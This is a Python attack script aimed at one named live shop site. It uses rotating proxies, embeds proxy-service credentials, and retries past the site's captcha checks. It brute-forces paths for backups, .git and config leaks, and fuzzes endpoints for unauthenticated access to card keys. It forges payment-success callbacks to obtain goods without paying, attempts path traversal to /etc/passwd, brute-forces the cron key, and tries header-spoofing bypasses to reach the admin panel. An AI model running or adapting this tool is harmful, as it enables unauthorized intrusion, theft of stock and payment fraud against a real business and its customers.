#!/usr/bin/env python3
"""
hmjf.lol 旁路漏洞完整扫描 v6
- 全路径/全 act/全 mod/notify 旁路/HTTP 方法/备份后缀/cron 词表
"""
import hashlib, json, os, re, subprocess, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://hmjf.lol/shop"
ROOT = "https://hmjf.lol"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/vuln_full_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
CK = f"{OUT}/.cookies"
os.makedirs(OUT, exist_ok=True)

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0
R = {"critical": [], "high": [], "medium": [], "low": [], "hits": [], "tests": {}}

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1)

def go(url, post=None, method=None, hdr=None, timeout=14):
    global N
    N += 1
    if N % 100 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__S:%{size_download}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX, "-b", CK, "-c", CK]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 4).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(5)
            refresh()
            return go(url, post, method, hdr, timeout)
        m = re.search(r"__C:(\d+)__S:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        code = int(m.group(1)) if m else 0
        size = int(m.group(2)) if m else len(body)
        return body, code, size
    except Exception as e:
        return str(e), 0, 0

def add(level, title, detail):
    entry = {"title": title, **detail}
    R[level].append(entry)
    R["hits"].append({"level": level, **entry})
    print(f"[{level.upper()}] {title}", flush=True)

def save():
    R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium", "low"]}
    R["requests"] = N
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def interesting(body, code, size, path=""):
    if code == 0 or size < 5:
        return False
    if code == 404 and size < 200:
        return False
    if code == 403 and "Forbidden" in body[:80]:
        return False
    bl = body.lower()
    markers = ["kminfo", "sys_key", "db_pass", "root:", "create table", "install.lock",
               "验证失败", '"code":0', "发送成功", "登录成功", "success", "卡密",
               "trade_no", "password", "mysql", "admin", "未登录", "No Act"]
    if any(x in body for x in markers):
        return True
    if code == 200 and size > 30 and "404 Not Found" not in body[:100]:
        if path.endswith((".php", "/")) or "ajax" in path or "api" in path:
            return size != 27 and size != 12  # skip empty api responses sometimes
    return False

def sess():
    go(f"{BASE}/")
    go(f"{BASE}/?mod=buy&tid=72")

def csrf_hs():
    page, _, _ = go(f"{BASE}/?mod=buy&tid=72")
    csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
    return csrf.group(1) if csrf else "", page

# ── [1] 路径字典 ──
print("[1] path brute", flush=True)
PATHS = []
# shop root php
for f in """ajax.php api.php cron.php toollogs.php index.php config.php
install/index.php install/install.lock install/update.php install/ajax.php
user/login.php user/reg.php user/findpwd.php user/record.php user/recharge.php
user/ajax.php user/ajax_chat.php user/index.php user/shop.php user/order.php
other/submit.php other/getshop.php other/epay_notify.php other/epay_return.php
other/notify.php other/download.php other/alipay.php other/wxpay.php other/qqpay.php
other/usdt.php other/pay.php other/return.php other/callback.php other/check.php
other/notify_alipay.php other/notify_wxpay.php other/notify_qqpay.php
assets/faka/js/faka.js template/default/index.php
""".split():
    f = f.strip()
    if f:
        PATHS.append(f"{BASE}/{f}")

# backup variants
bases = ["config.php", "ajax.php", "api.php", "install/index.php",
         "other/epay_notify.php", "includes/common.php", "includes/config.php"]
for b in bases:
    for ext in [".bak", ".old", ".save", "~", ".swp", ".txt", ".dist", ".inc", ".php.bak"]:
        PATHS.append(f"{BASE}/{b}{ext}")

# rainbow extras
for p in """admin/ admin/login.php admin888/ manage/ supplier/ agent/
api/order.php api/goods.php api/user.php mini.php wap.php m.php
pay.php notify.php callback.php webhook.php qrcode.php poster.php
includes/ajax.php includes/common.php includes/lib/Soft.php
user/ajax_user.php user/ajax_order.php user/shoplist.php
other/getshop.php.bak other/submit.php.bak
.known_hosts .git/HEAD .git/config .env .svn/entries
backup.zip backup.sql shop.zip www.zip site.tar.gz data.zip
runtime/log/ logs/error.log log.txt debug.log
phpinfo.php info.php test.php p.php 1.php shell.php
""".split():
    p = p.strip()
    if p:
        PATHS.append(f"{BASE}/{p}")

PATHS = list(dict.fromkeys(PATHS))
for p in PATHS:
    body, code, size = go(p)
    key = p.replace(BASE, "")
    R["tests"][f"path:{key}"] = {"code": code, "size": size, "snip": body[:120]}
    if p.endswith("install.lock") and code == 200:
        add("high", "install.lock可下载", {"content": body[:50]})
    if "install/" in p and code == 200 and "install.lock" in body:
        add("critical", "install可重装", {"path": key})
    if any(x in body for x in ["SYS_KEY", "db_pass", "DB_PASSWORD"]) and code == 200:
        add("critical", f"配置泄露 {key}", {"snippet": body[:300]})
    if ".git" in p and "ref:" in body:
        add("critical", ".git泄露", {"path": key})
    if "phpinfo" in p.lower() and "PHP Version" in body:
        add("high", "phpinfo", {"path": key})
    if "kminfo" in body.lower():
        add("critical", f"卡密泄露 {key}", {"snippet": body[:200]})
    time.sleep(0.05)
save()

# ── [2] ajax act 全表 ──
print("[2] ajax acts", flush=True)
AJAX_ACTS = """pay payrmb order query buy gettool getclass getgoods gettoolnew getleftcount
cart_info cart_list cart_add submit cancel checklogin login reg upload info list toollist
changepwd apply_refund gift_start gift_stop workorder captcha getcount getshuoshuo getrizhi
getshareid share_invitegift_link SharePoster getgoodslist update notify test daifu recharge
rankings article contact message stock export import kami card downcard kmquery cardquery
orderlist myorder buyok sendkm stockkm fakaquery kmexport downkm queryorder toollogs
getmulti gettoollist getsharelink invitegift gift_list coupon verify sms email refund
""".split()
csrf, _ = csrf_hs()
HS = "256"
sess()
for act in AJAX_ACTS:
    for mode, post in [
        ("get", None),
        ("post_empty", ""),
        ("post_tid", "tid=72"),
        ("post_csrf", f"tid=72&csrf_token={csrf}"),
        ("post_hs", f"tid=72&hashsalt={HS}&csrf_token={csrf}"),
        ("post_query", "type=1&qq=20260716031453854"),
        ("post_order", "id=1&skey=" + "0" * 32),
    ]:
        body, code, size = go(f"{BASE}/ajax.php?act={act}", post=post)
        key = f"ajax:{act}:{mode}"
        if size > 0 and (code != 404):
            R["tests"][key] = {"code": code, "size": size, "body": body[:150]}
        if '"code":0' in body and act in ("upload", "export", "import", "stock", "kami", "downcard", "sendkm"):
            add("critical", f"ajax {act} 未授权成功", {"mode": mode, "resp": body[:250]})
        if "kminfo" in body.lower():
            add("critical", f"ajax {act} 卡密", {"resp": body[:300]})
        if act == "query" and '"data"' in body and len(body) > 80:
            add("high", "query旁路泄露", {"mode": mode, "body": body[:400]})
        if act == "cancel" and '"code":0' in body:
            add("high", "cancel旁路成功", {"resp": body[:150]})
    time.sleep(0.04)
save()

# ── [3] api.php + user/ajax.php acts ──
print("[3] api + user/ajax", flush=True)
API_ACTS = """goods order query detail list pay buy user info tool kami card shop config
admin login notify refund money toollist stock export import goodslist orderlist status
check queryorder trade notify_refund transfer balance""".split()
for act in API_ACTS:
    for meth, post in [("get", None), ("post", f"act={act}&pid=1003"), ("post", f"trade_no=20260716031453854")]:
        body, code, size = go(f"{BASE}/api.php?act={act}", post=post)
        if size > 27:
            R["tests"][f"api:{act}:{meth}"] = {"code": code, "size": size, "body": body[:150]}
            if code == 500 or any(x in body.lower() for x in ["sql", "fatal", "warning", "stack"]):
                add("high", f"api.php信息泄露 act={act}", {"body": body[:300]})
            if size > 50 and '"code":-5' not in body and '"code":-4' not in body:
                add("medium", f"api.php非空响应 act={act}", {"body": body[:200]})
    time.sleep(0.05)

for act in """login reg order query info shop record recharge changepwd list kami card
export import stock goods pay notify logout userinfo balance transfer""".split():
    body, code, size = go(f"{BASE}/user/ajax.php?act={act}", post="")
    if size > 15:
        R["tests"][f"uajax:{act}"] = {"code": code, "size": size, "body": body[:150]}
        if '"code":0' in body and act in ("order", "kami", "card", "export", "stock"):
            add("critical", f"user/ajax {act} 未授权", {"resp": body[:250]})
    time.sleep(0.04)
save()

# ── [4] mod= 旁路 ──
print("[4] mod fuzz", flush=True)
MODS = """index buy order query cart so list tool goods class article contact about
help faq message ranking recharge user login reg admin api test kami card stock export
buyok pay notify return download ajax json xml rpc backup install config debug phpinfo
toollogs record workorder gift coupon share invite""".split()
for mod in MODS:
    for extra in ["", "&id=1", "&tid=72", "&data=20260716031453854", "&orderid=1", "&cid=1"]:
        body, code, size = go(f"{BASE}/?mod={mod}{extra}")
        if interesting(body, code, size, mod):
            R["tests"][f"mod:{mod}{extra}"] = {"code": code, "size": size, "snip": body[:150]}
            if "kminfo" in body.lower() or "showOrder" in body:
                add("high", f"mod旁路 {mod}{extra}", {"snippet": body[:250]})
            if "SYS_KEY" in body or "db_" in body.lower():
                add("critical", f"mod配置泄露 {mod}", {"snippet": body[:200]})
    time.sleep(0.03)
save()

# ── [5] notify / getshop 旁路 ──
print("[5] notify bypass", flush=True)
tn = "20260716031453854"
sh, _, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
params = dict(re.findall(r'name="([^"]+)"\s+value="([^"]+)"', sh))
notify_paths = [
    "other/epay_notify.php", "other/notify.php", "other/callback.php",
    "other/return.php", "other/alipay.php", "other/wxpay.php",
    "notify.php", "epay_notify.php", "callback.php", "pay/notify.php",
]
for path in notify_paths:
    qs = "&".join(f"{k}={urllib.parse.quote(v)}" for k, v in sorted(params.items()))
    for suffix in ["", "&trade_status=TRADE_SUCCESS", "&trade_status=TRADE_SUCCESS&trade_no=1"]:
        body, code, size = go(f"{BASE}/{path}?{qs}{suffix}")
        key = f"notify:{path}:{suffix[:20]}"
        R["tests"][key] = {"code": code, "size": size, "body": body[:80]}
        if body.strip().lower() in ("success", "ok") and size < 20:
            gs, _, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
            if "未付款" not in gs:
                add("critical", f"notify旁路到账 {path}", {"notify": body, "getshop": gs[:150]})
    time.sleep(0.08)

# getshop params
for q in [f"trade_no={tn}", f"orderid={tn}", f"id=1", f"trade_no={tn}'", f"trade_no=../../../etc/passwd",
          f"trade_no={tn}&format=json", f"out_trade_no={tn}", f"sign=1"]:
    body, code, size = go(f"{BASE}/other/getshop.php?{q}")
    if "kminfo" in body.lower() or "root:" in body:
        add("critical", f"getshop旁路 {q}", {"body": body[:200]})
    R["tests"][f"getshop:{q[:30]}"] = {"code": code, "size": size, "snip": body[:100]}
save()

# ── [6] HTTP 方法 / install 旁路 ──
print("[6] HTTP methods", flush=True)
for path, methods in [
    (f"{BASE}/install/install.lock", ["GET", "PUT", "DELETE", "PATCH", "OPTIONS"]),
    (f"{BASE}/install/index.php", ["GET", "POST", "DELETE"]),
    (f"{BASE}/config.php", ["GET", "OPTIONS"]),
]:
    for m in methods:
        body, code, size = go(path, method=m)
        R["tests"][f"method:{m}:{path.split('/')[-1]}"] = {"code": code, "size": size, "snip": body[:80]}
        if m == "DELETE" and code in (200, 204) and "安装锁" not in body and "405" not in body and "Not Allowed" not in body:
            add("critical", f"install.lock可DELETE", {"resp": body[:100]})
        if m == "PUT" and code in (200, 201, 204):
            add("high", f"install.lock可PUT", {"resp": body[:100]})
save()

# ── [7] cron 大词表 ──
print("[7] cron keys", flush=True)
keys = [str(i) for i in range(10000)] + """hmjf xuxin xuxin66 xuxin66vip datou111 datou333
ttwl66 1003 faka shua caihong rainbow yunshang 666666 888888 admin secret key password
cron monitor 虚心 虚心U install SYS_KEY md5 hm2026 lol shop 2025 2026""".split()
keys = list(dict.fromkeys(keys))[:500]
for k in keys:
    body, code, size = go(f"{BASE}/cron.php?key={urllib.parse.quote(k)}")
    if code == 200 and "不正确" not in body and size > 30:
        add("high", f"cron key={k}", {"resp": body[:200]})
        break
    if k in ("hmjf", "xuxin", "1003", "admin", "datou111"):
        R["tests"][f"cron:{k}"] = body[:80]
    time.sleep(0.03)
save()

# ── [8] chat / 客服旁路 ──
print("[8] chat bypass", flush=True)
for act in ["get", "send", "list", "history", "msg", "read", "poll"]:
    for post in ["", "content=test", "session_id=1", "id=1", "admin=1"]:
        body, code, size = go(f"{BASE}/user/ajax_chat.php?act={act}", post=post or None)
        if '"code":0' in body:
            R["tests"][f"chat:{act}:{post[:15]}"] = body[:120]
            if act == "send":
                add("high", "客服send未授权", {"post": post, "resp": body[:100]})
            if act in ("list", "history") and "data" in body and len(body) > 80:
                add("high", f"客服{act}泄露", {"resp": body[:200]})
    body2, _, _ = go(f"{BASE}/user/ajax_chat.php?act={act}&session_id=1")
    time.sleep(0.05)
save()

# ── [9] act 大小写/编码旁路 ──
print("[9] act bypass", flush=True)
for act in ["ORDER", "Order", "pay%00", "getcount", "../order", "order%20"]:
    body, code, size = go(f"{BASE}/ajax.php?act={act}", post="id=1&skey=" + "0" * 32)
    if '"code":0' in body or ("验证失败" not in body and "kminfo" in body.lower()):
        R["tests"][f"actbypass:{act}"] = body[:120]
        if "kminfo" in body.lower():
            add("critical", f"act旁路 {act}", {"resp": body[:200]})
save()

# ── [10] 头旁路 ──
print("[10] header bypass", flush=True)
for hdr in [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Original-URL": "/shop/admin/"},
    {"X-Rewrite-URL": "/admin/"},
]:
    body, code, size = go(f"{BASE}/ajax.php?act=getcount", post="", hdr=hdr)
    if '"orders"' in body and not hdr:
        add("high", "getcount经营数据未授权", {"body": body[:300]})
    body2, code2, size2 = go(f"{BASE}/admin/", hdr=hdr)
    if code2 == 200 and size2 > 200 and "404" not in body2[:50]:
        add("high", "admin头旁路", {"hdr": hdr, "snippet": body2[:200]})
save()

save()
print(f"DONE requests={N} summary={R['summary']}", flush=True)
